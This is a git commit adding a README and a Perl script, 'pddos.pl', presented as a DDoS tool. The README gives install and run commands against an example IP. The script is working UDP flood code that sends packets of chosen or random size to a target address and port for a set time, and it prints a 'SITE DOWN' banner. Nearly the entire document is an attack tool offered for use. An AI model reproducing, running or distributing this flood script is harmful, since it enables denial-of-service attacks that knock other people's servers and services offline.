c02c7d136f050ed41edd0735b25f13cbb9945b0f
Rahat Khan Tusar(RKT) <69615463+r3k4t@users.noreply.github.com>
2020-11-07 18:07:54 +0530

    Add files via upload

---
+++ README.md
@@ -0,0 +1,50 @@
+[![MIT](https://img.shields.io/packagist/l/doctrine/orm.svg)](https://github.com/r3k4t/pddos/blob/master/LICENSE) 
+![perl](https://img.shields.io/badge/perl-orange.svg)](https://en.wikipedia.org/wiki/Perl)
+[![OS](https://img.shields.io/badge/Tested%20On-Linux-yellowgreen.svg)](https://en.wikipedia.org/wiki/Linux/)
+
+<h2>PDDOS(Perl DDOS)</h2>
+
+<h4>Author : RKT</h4>
+
+### Description ###
+
+![Screenshot at 2020-11-07 08-03-49](https://user-images.githubusercontent.com/69615463/98440859-462e2a00-2121-11eb-84c3-041d16b54c15.png)
+
+### What is a DDoS(Distributed Denial-Of-Service)? ###
+
+A distributed denial-of-service (DDoS) attack is a malicious attempt to disrupt the normal traffic of a targeted server, service or network by overwhelming the target or its surrounding infrastructure with a flood of Internet traffic.
+
+DDoS attacks achieve effectiveness by utilizing multiple compromised computer systems as sources of attack traffic. Exploited machines can include computers and other networked resources such as IoT devices.
+
+From a high level, a DDoS attack is like an unexpected traffic jam clogging up the highway, preventing regular traffic from arriving at its destination.
+
+
+#### Tested On ###
+                                       
+<ul>
+<li>Ubuntu</li>
+<li>Kali Linux</li>
+<li>Linuxmint</li>
+<li>Parrot Os</li>
+</ul>
+
+### Installiation ###
+
+<ul>
+<li> sudo apt install perl</li>
+</ul>
+
+### Terminal Command ###
+
+<ul>
+<li>git clone https://github.com/r3k4t/pddos.git</li>
+<li>cd pddos  </li>
+
+Example :
+
+<li>perl pddos.pl 1.1.1.1 80 100 100 </li>
+</ul>
+
+### Screenshots ###
+
+
---
+++ pddos.pl
@@ -0,0 +1,68 @@
+
+#!/usr/bin/perl
+
+
+
+
+ 
+use Socket;
+use strict;
+ 
+my ($ip,$port,$size,$time) = @ARGV;
+ 
+my ($iaddr,$endtime,$psize,$pport);
+ 
+$iaddr = inet_aton("$ip") or die "Cannot resolve hostname.(Example:perl ddos.pl 1.1.1.1 80 100 100) $ip\n";
+$endtime = time() + ($time ? $time : 100);
+socket(flood, PF_INET, SOCK_DGRAM, 17);
+ 
+system("clear");
+
+
+
+print <<EOTEXT;
+ 
+   .                                                      .
+        .n                   .                 .                  n.
+  .   .dP                  dP                   9b                 9b.    .
+ 4    qXb         .       dX                     Xb       .        dXp     t
+dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
+9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
+ 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
+  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
+    `9XXXXXXXXXXXP' `9XX'    SITE  `98v8P'  DOWN    `XXP' `9XXXXXXXXXXXP'
+        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
+                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
+                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
+                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
+                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
+                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
+                     `'      9XXXXXX(   )XXXXXXP      `'
+                              XXXX X.`v'.X XXXX
+                              XP^X'`b   d'`X^XX
+                              X. 9  `   '  P )X
+                              `b  `       '  d'
+                               `             '
+EOTEXT
+
+print  <<EOTEXT;        
+                        Author : Rahat Khan Tusar(RKT)
+                       Github : https://github.com/r3k4t
+EOTEXT
+ 
+
+print "~You are Flooding the IP Address: $ip " . ($port ? $port : "random") . " With " .
+($size ? "$size-byte" : "DDoS attack with this many Packets?") . " " .
+($time ? "for $time seconds" : "") . "\n";
+ 
+for (;time() <= $endtime;) {
+$psize = $size ? $size : int(rand(1024-64)+64) ;
+$pport = $port ? $port : int(rand(65534))+1;
+ 
+send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
+$iaddr));}for (;time() <= $endtime;) {
+$psize = $size ? $size : int(rand(1024-64)+64) ;
+$pport = $port ? $port : int(rand(65534))+1;
+ 
+send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
+$iaddr));}
